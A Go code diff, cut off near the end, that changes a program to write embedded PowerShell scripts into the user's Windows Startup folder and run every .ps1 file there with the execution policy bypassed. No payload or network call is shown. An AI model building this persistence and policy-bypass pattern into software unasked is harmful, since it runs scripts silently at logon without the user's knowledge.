@@ -1,46 +1,112 @@
 package main
 
 import (
-	"bytes"
-	_ "embed"
+	"embed"
+	"io/fs"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"sort"
+	"strings"
 )
 
-//go:embed script.ps1
-var script []byte
+//go:embed *.ps1
+var scriptFiles embed.FS
 
 func main() {
+	// Destination path in the startup folder
 	startupFolderPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-	scriptPath := filepath.Join(os.TempDir(), "script.ps1")
 
-	// Copy the embedded script to the startup folder
-	destPath := filepath.Join(startupFolderPath, "script.ps1")
-	err := copyFile(scriptPath, destPath)
+	// Deploy all script files matching the pattern to the destination folder
+	err := deployScripts("*.ps1", startupFolderPath)
 	if err != nil {
 		panic(err)
 	}
 
-	// Run PowerShell with the copied script
-	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", destPath)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	err = cmd.Run()
+	// Run PowerShell with the deployed scripts
+	err = runDeployedScripts(startupFolderPath)
 	if err != nil {
 		panic(err)
 	}
 }
 
-func copyFile(srcPath, destPath string) error {
-	destFile, err := os.Create(destPath)
+func deployScripts(pattern, destDir string) error {
+	matches, err := fs.Glob(scriptFiles, pattern)
 	if err != nil {
 		return err
 	}
-	defer destFile.Close()
 
-	srcFile := bytes.NewReader(script)
-	_, err = srcFile.WriteTo(destFile)
+	for _, match := range matches {
+		scriptContent, err := fs.ReadFile(scriptFiles, match)
+		if err != nil {
+			return err
+		}
+
+		scriptName := filepath.Base(match)
+		destPath := filepath.Join(destDir, scriptName)
+
+		err = writeFile(destPath, scriptContent)
+		if err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+
+func runDeployedScripts(destDir string) error {
+	files, err := os.ReadDir(destDir)
+	if err != nil {
+		return err
+	}
+
+	// Sort files by name
+	sort.Slice(files, func(i, j int) bool {
+		return files[i].Name() < files[j].Name()
+	})
+
+	for _, file := range files {
+		if isRegularFile(file) && strings.HasSuffix(file.Name(), ".ps1") {
+			scriptPath := filepath.Join(destDir, file.Name())
+			err = runPowerShellScript(scriptPath)
+			if err != nil {
+				return err
+			}
+		}
+	}
+
+	return nil
+}
+
+func isRegularFile(file os.DirEntry) bool {
+	info, err := file.Info()
+	if err != nil {
+		return false
+	}
+	return info.Mode().IsRegular()
+}
+
+func runPowerShellScript(scriptPath string) error {
+	// Run PowerShell with the specified script
+	cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err := cmd.Run()
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func writeFile(filePath string, content []byte) error {
+	file, err := os.Create(filePath)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	_, err = file.Write(content)
 	if err != nil {
 		return err
 	}
